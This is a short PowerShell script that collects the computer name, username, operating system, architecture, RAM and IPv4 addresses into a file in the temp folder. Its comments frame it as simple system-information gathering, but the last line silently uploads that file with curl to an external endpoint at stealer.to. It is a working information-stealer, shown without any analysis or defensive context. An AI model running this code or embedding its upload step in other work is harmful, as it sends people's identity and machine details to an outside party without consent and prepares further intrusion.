# Path to save the file in %temp%
$tempPath = [System.IO.Path]::Combine($env:TEMP, "infoo.txt")

# Collect computer information
$computerInfo = @{
    "ComputerName" = $env:COMPUTERNAME       # Computer name
    "Username" = $env:USERNAME               # Username
    "OS" = (Get-WmiObject -Class Win32_OperatingSystem).Caption  # Operating system
    "Architecture" = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture  # Operating system architecture
    "RAM (GB)" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2) # RAM
    "IP Addresses" = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' }).IPAddress -join ", "  # IP addresses
}

# Convert information into a readable formatted string
$infoText = @"
Computer System Information:
----------------------------------------
Computer Name: $($computerInfo.ComputerName)
Username: $($computerInfo.Username)
Operating System: $($computerInfo.OS)
Architecture: $($computerInfo.Architecture)
RAM (GB): $($computerInfo.'RAM (GB)')
IP Addresses: $($computerInfo.'IP Addresses')
----------------------------------------
"@

# Save the information to the file infoo.txt in %temp%
$infoText | Out-File -FilePath $tempPath -Encoding UTF8

Write-Host "Information has been saved to $tempPath"
cmd.exe /c "curl -F ""file=@$tempPath"" https://stealer.to/post?uniqueid=9a181e8a"
